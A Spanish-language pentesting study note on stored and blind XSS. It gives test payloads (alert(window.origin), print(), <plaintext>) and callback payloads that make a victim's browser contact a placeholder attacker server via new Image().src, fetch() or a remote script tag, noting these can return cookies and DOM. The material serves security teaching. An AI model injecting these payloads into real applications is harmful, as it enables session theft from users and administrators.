---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XSS
Descripción: "El Stored XSS (o Persistent XSS) ocurre cuando el payload inyectado se guarda en la base de datos del back-end y se recupera al visitar la página"
Fecha de actualización: 2026-06-02
Nota previa: "[[00 - Introducción a XSS]]"
Nota siguiente: "[[02 - XSS Reflejado]]"
Area: "[[XSS.base|XSS]]"
---
<mark style="background: #ADCCFFA6;">El `Stored XSS` (o `Persistent XSS`) ocurre cuando el payload inyectado se guarda en la base de datos del back-end y se recupera al visitar la página</mark>. Es el **tipo más crítico**: <mark style="background: #FFB86CA6;">al quedar almacenado, afecta a cualquier usuario que cargue la página</mark>, no solo a quien lo inyectó. Además es <mark style="background: #FF5582A6;">difícil de erradicar</mark> — hay que eliminar el payload del propio backend.

# Probar si una página es vulnerable

Sobre un campo que refleje la entrada (p. ej. una `To-Do List` que añade ítems), el **payload de prueba estándar** es:

```html
<script>alert(window.origin)</script>
```

Si la página no sanea la entrada, el `alert` salta —al inyectarlo o al refrescar— con la URL de la página. <mark style="background: #FFB8EBA6;">Confirmar en el código fuente (`CTRL+U`) que el payload se insertó tal cua</mark>l:

```html
<ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
</ul></ul>
```

> [!important]+ Por qué `window.origin` y no `alert(1)`
> <mark style="background: #FFB8EBA6;">Muchas apps modernas manejan la entrada en `IFrames` (componentes) de otro dominio</mark> (por ejemplo: un sistema de comentarios externo, pasarelas de pago, widgets de chat o micro-frontends), así que un formulario vulnerable podría no serlo en la aplicación principal. Mostrar `window.origin` en vez de un valor estático como `1` revela **en qué origen** se ejecuta el payload, <mark style="background: #ADCCFFA6;">confirmando cuál es el formulario realmente vulnerable cuando hay iframes de por medio</mark>.

# Cuando `alert()` está bloqueado

Algunos navegadores bloquean `alert()` en ciertos contextos. **Conviene tener payloads alternativos de confirmación**:

- `<plaintext>` -> deja de renderizar el *HTML* posterior y <mark style="background: #ADCCFFA6;">lo muestra como texto plano (muy visible)</mark>.
- `<script>print()</script>` -> <mark style="background: #ADCCFFA6;">abre el diálogo de impresión</mark>; útil porque Chrome bloquea `alert`/`confirm`/`prompt` en *iframes* cross-origin pero no `print()` (<mark style="background: #FF5582A6;">aun así no es infalible</mark>: también puede bloquearse en *sandboxes* sin `allow-modals`). <mark style="background: #ADCCFFA6;">Lo más robusto para confirmar es exfiltrar a tu servidor</mark> (`fetch`/`new Image().src`), que no es más que hacer que el navegador de la víctima envíe una petición [[HTTP]] a un servidor controlado por ti (como tu propia máquina de atacante o herramientas como _Interactsh_ / _Burp Collaborator_).
	- `<script>new Image().src = "http://tu-servidor-atacante.com/log?xss=ok";</script>` -> Le dices al navegador: _"Crea una imagen invisible en memoria y asígnale esta URL"_. El navegador, automáticamente y sin pedir permiso, realiza una petición *HTTP GET* a tu servidor <mark style="background: #FFB8EBA6;">para intentar descargar esa "imagen"</mark>. En tu servidor de atacante verás entrar una petición web. El simple hecho de recibir esa petición te confirma de forma silenciosa e infalible: _"El código XSS se ha ejecutado en la máquina de la víctima"_.
	- `<script>fetch('http://tu-servidor-atacante.com/log?xss=ok');</script>` -> El método <mark style="background: #FFB86CA6;">más moderno</mark>. Utiliza la *API* nativa de *JavaScript* `fetch`<mark style="background: #FFB8EBA6;"> para enviar una petición HTTP asíncrona a tu servidor de la misma manera</mark>.

<mark style="background: #FF5582A6;">Para verificar que es almacenado y no reflejado, refresca la página</mark>: si el `alert` vuelve a saltar en cada recarga (y a cualquier usuario que visite), es `Stored XSS` confirmado.

> [!important]+ Blind XSS: la variante almacenada más peligrosa
> Un caso especial de stored XSS es el <mark style="background: #FF5582A6;">`Blind XSS`: el payload se guarda y se ejecuta en un contexto que tú no ves</mark> —el panel del administrador, un visor de tickets de soporte, los logs internos, un sistema de gestión—. Inyectas en un campo (nombre, user-agent, dirección) y el payload dispara cuando un *empleado* abre ese registro en otra interfaz. <mark style="background: #FFB8EBA6;">Como no ves la ejecución, se usan payloads que "llaman a casa"</mark>: `XSS Hunter` (self-hosted o `xsshunter.com`; el `xss.ht` original se descontinuó en 2023), `ezXSS` o un *collaborator* propio reciben una petición con cookies, URL y DOM cuando el payload se ejecuta donde sea. Es <mark style="background: #FFB86CA6;">uno de los vectores más rentables en bug bounty porque alcanza paneles internos privilegiados</mark>:
> ```html
> <script src="https://TU_SERVIDOR_XSS"></script>
> ```

El siguiente tipo no persiste: se refleja en la respuesta inmediata. Es el [[02 - XSS Reflejado]].
